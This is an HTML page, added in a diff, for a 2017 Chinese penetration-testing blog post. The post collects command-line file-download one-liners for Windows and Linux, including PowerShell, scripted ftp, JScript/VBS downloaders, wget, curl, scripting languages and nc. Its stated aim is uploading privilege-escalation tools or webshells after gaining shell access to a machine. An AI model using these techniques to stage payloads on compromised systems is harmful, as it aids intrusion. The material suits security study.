@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="">
+  <head>
+    
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="description" content="有时候我们拿到一个命令行的权限如ssh、telnet之后，种种原因需要上传提权文件、webshell，总结一些常见的命令，随时更新。"/>
+
+
+
+
+  <meta name="keywords" content="渗透, 命令" />
+
+
+
+
+
+  <link rel="alternate" href="/default" title="Bypass.World">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />
+
+
+
+<link rel="canonical" href="http://yoursite.com/2017/04/命令行内下载总结/"/>
+
+
+<meta name="description" content="有时候我们拿到一个命令行的权限如ssh、telnet之后，种种原因需要上传提权文件、webshell，总结一些常见的命令，随时更新。">
+<meta name="keywords" content="渗透, 命令">
+<meta property="og:type" content="article">
+<meta property="og:title" content="命令行内下载总结">
+<meta property="og:url" content="http://yoursite.com/2017/04/命令行内下载总结/index.html">
+<meta property="og:site_name" content="Bypass.World">
+<meta property="og:description" content="有时候我们拿到一个命令行的权限如ssh、telnet之后，种种原因需要上传提权文件、webshell，总结一些常见的命令，随时更新。">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2017-09-19T17:19:57.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="命令行内下载总结">
+<meta name="twitter:description" content="有时候我们拿到一个命令行的权限如ssh、telnet之后，种种原因需要上传提权文件、webshell，总结一些常见的命令，随时更新。">
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
+<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>
+
+
+
+
+
+<script type="text/javascript">
+  var themeConfig = {
+    fancybox: {
+      enable: false
+    },
+  };
+</script>
+
+
+
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?686eedfda259ce1d887831c94f49f99f";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  <script type="text/javascript">
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+        ga('create', 'UA-106734017-1', 'auto');
+        ga('send', 'pageview');
+  </script>
+
+
+
+    <title> 命令行内下载总结 - Bypass.World </title>
+  </head>
+
+  <body>
+    <div id="page">
+      <header id="masthead"><div class="site-header-inner">
+    <h1 class="site-title">
+        <a href="/." class="logo">Bypass.World</a>
+    </h1>
+
+    <nav id="nav-top">
+        
+            <ul id="menu-top" class="nav-top-items">
+                
+                    <li class="menu-item">
+                        <a href="/archives">
+                            
+                            
+                                Archives
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/about">
+                            
+                            
+                                About
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        
+  </nav>
+</div>
+
+      </header>
+      <div id="content">
+        
+    <div id="primary">
+        
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          命令行内下载总结
+        
+      </h1>
+
+      <time class="post-time">
+          Apr 6 2017
+      </time>
+    </header>
+
+
+
+    
+            <div class="post-content">
+            <h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><h4 id="1、powershell"><a href="#1、powershell" class="headerlink" title="1、powershell"></a>1、powershell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">//powershell一行命令下载1</div><div class="line">powershell $client = new-object System.Net.WebClient;$client.DownloadFile(&apos;https://baidu.com&apos;,&apos;file.name&apos;)</div><div class="line"></div><div class="line">//powershell一行命令下载2</div><div class="line">Invoke-WebRequest -uri &apos;https://baidu.com&apos; -OutFile &apos;file.name&apos;</div><div class="line"></div><div class="line">//有时候需要写批处理实现</div><div class="line">echo powershell $client = new-object System.Net.WebClient;$client.DownloadFile(&apos;https://baidu.com&apos;,&apos;file.name&apos;) &gt; 1.bat</div><div class="line">//注意在不同环境中特殊字符的转码</div></pre></td></tr></table></figure>
+<h4 id="2、ftp"><a href="#2、ftp" class="headerlink" title="2、ftp"></a>2、ftp</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">echo open ftp.xx.xx &gt;&gt;1.txt</div><div class="line">echo username &gt;&gt;1.txt</div><div class="line">echo password &gt;&gt;1.txt</div><div class="line">echo get vc.exe xx.exe &gt;&gt;1.txt</div><div class="line">echo bye &gt;&gt; 1.txt</div><div class="line">ftp -i -v -s:1.txt</div></pre></td></tr></table></figure>
+<h4 id="3、cscript执行js"><a href="#3、cscript执行js" class="headerlink" title="3、cscript执行js"></a>3、cscript执行js</h4><p>这个copy别人的也不是很懂<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">echo=1/*&gt;nul&amp;@cls</div><div class="line">@echo off</div><div class="line">call :http &quot;https://bypass.world&quot; a.html</div><div class="line">goto :eof</div><div class="line"></div><div class="line">:http</div><div class="line">cscript -nologo -e:jscript &quot;%~f0&quot; &quot;%~1&quot; &quot;%~2&quot;</div><div class="line">echo OK!</div><div class="line">goto :eof</div><div class="line"></div><div class="line">*/</div><div class="line">var iLocal,iRemote,xPost,sGet;</div><div class="line">iLocal =WScript.Arguments(1); </div><div class="line">iRemote = WScript.Arguments(0); </div><div class="line">iLocal=iLocal.toLowerCase();</div><div class="line">iRemote=iRemote.toLowerCase();</div><div class="line">xPost = new ActiveXObject(&quot;Microsoft&quot;+String.fromCharCode(0x2e)+&quot;XMLHTTP&quot;);</div><div class="line">xPost.Open(&quot;GET&quot;,iRemote,0);</div><div class="line">xPost.Send();</div><div class="line">sGet = new ActiveXObject(&quot;ADODB&quot;+String.fromCharCode(0x2e)+&quot;Stream&quot;);</div><div class="line">sGet.Mode = 3;</div><div class="line">sGet.Type = 1; </div><div class="line">sGet.Open(); </div><div class="line">sGet.Write(xPost.responseBody);</div><div class="line">sGet.SaveToFile(iLocal,2);</div><div class="line">sGet.close()</div></pre></td></tr></table></figure></p>
+<h4 id="4、vbs"><a href="#4、vbs" class="headerlink" title="4、vbs"></a>4、vbs</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">echo Set Post = CreateObject(&quot;Msxml2.XMLHTTP&quot;) &gt;&gt;1.vbs</div><div class="line">echo Set Shell = CreateObject(&quot;Wscript.Shell&quot;) &gt;&gt;1.vbs</div><div class="line">echo Post.Open &quot;GET&quot;,&quot;http://baidu.com&quot;,0 &gt;&gt;1.vbs</div><div class="line">echo Post.Send() &gt;&gt;1.vbs</div><div class="line">echo Set aGet = CreateObject(&quot;ADODB.Stream&quot;) &gt;&gt;1.vbs</div><div class="line">echo aGet.Mode = 3 &gt;&gt;1.vbs</div><div class="line">echo aGet.Type = 1 &gt;&gt;1.vbs</div><div class="line">echo aGet.Open() &gt;&gt;1.vbs</div><div class="line">echo aGet.Write(Post.responseBody) &gt;&gt;1.vbs</div><div class="line">echo aGet.SaveToFile &quot;1.html&quot;,2 &gt;&gt;1.vbs</div><div class="line">start 1.vbs</div></pre></td></tr></table></figure>
+<p>windows下有powershell或者ftp最好了，另外两种稍麻烦了点。</p>
+<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h4 id="1、wget"><a href="#1、wget" class="headerlink" title="1、wget"></a>1、wget</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wget https://bypass.world -O 1.html</div></pre></td></tr></table></figure>
+<h4 id="2、curl"><a href="#2、curl" class="headerlink" title="2、curl"></a>2、curl</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl -o 1.html https://bypass.world</div></pre></td></tr></table></figure>
+<h4 id="3、python"><a href="#3、python" class="headerlink" title="3、python"></a>3、python</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -c <span class="string">"import urllib;urllib.urlretrieve('https://bypass.world', '1.txt')"</span></div></pre></td></tr></table></figure>
+<h4 id="4、ruby"><a href="#4、ruby" class="headerlink" title="4、ruby"></a>4、ruby</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ruby -e <span class="string">"require 'open-uri';File.open('1.txt', 'wb') &#123;|f| f.write(open('https://bypass.world') &#123;|f1| f1.read&#125;)&#125;"</span></div></pre></td></tr></table></figure>
+<h4 id="5、perl"><a href="#5、perl" class="headerlink" title="5、perl"></a>5、perl</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">//这个只能http，https的话需要LWP::UserAgent;</div><div class="line">perl -e <span class="string">"use LWP::Simple;getstore('http://baidu.com', '1.txt');"</span></div></pre></td></tr></table></figure>
+<h4 id="6、php"><a href="#6、php" class="headerlink" title="6、php"></a>6、php</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">//copy</div><div class="line">php -r <span class="string">"copy('https://bypass.world','1.txt');"</span></div><div class="line">//file_put_contents</div><div class="line">php -r <span class="string">"file_put_contents('2.txt',file_get_contents('http://bypass.world'));"</span></div></pre></td></tr></table></figure>
+<h4 id="7、nc"><a href="#7、nc" class="headerlink" title="7、nc"></a>7、nc</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">//server</div><div class="line">nc -l 5678 &gt; 1.tar</div><div class="line">//client</div><div class="line">nc servre_ip 5678 &lt; 1.tar</div></pre></td></tr></table></figure>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>windows上下载工具比较少，自带的就是powershell或者ftp，很多低版本服务器没powershell或者ftp很尴尬，js或者vps命令行太长基本就是辅助。<br>linux上成堆的下载工具，wget、curl就不说了。除了上面列举的一些，还有ssh/scp、nc、ftp等，甚至apt-get、yum通过片添加下载源来下载文件。</p>
+
+            </div>
+          
+
+    
+      <footer class="post-footer">
+		
+		<div class="post-tags">
+		  
+			<a href="/tags/渗透/">渗透</a>
+		  
+		</div>
+		
+
+        
+        
+  <nav class="post-nav">
+    
+      <a class="prev" href="/2017/04/office最新漏洞利用-CVE-2017-0199/">
+        <i class="iconfont icon-left"></i>
+        <span class="prev-text nav-default">office最新漏洞利用(CVE-2017-0199)</span>
+        <span class="prev-text nav-mobile">Prev</span>
+      </a>
+    
+    
+      <a class="next" href="/2017/03/某牛的xss payload/">
+        <span class="next-text nav-default">某牛的xss payload</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    
+  </nav>
+
+        
+
+      </footer>
+    
+  </article>
+
+    </div>
+
+      </div>
+
+      <footer id="colophon"><span class="copyright-year">
+    
+        &copy;
+    
+        2014 -
+    
+    2017
+    <span class="footer-author">Norman.Chew.</span>
+    <span class="power-by">
+        Powered by <a class="hexo-link" href="https://hexo.io/">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear">Polar Bear</a>
+    </span>
+</span>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+    
+
+
+    
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+
+    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>
+
+  </body>
+</html>
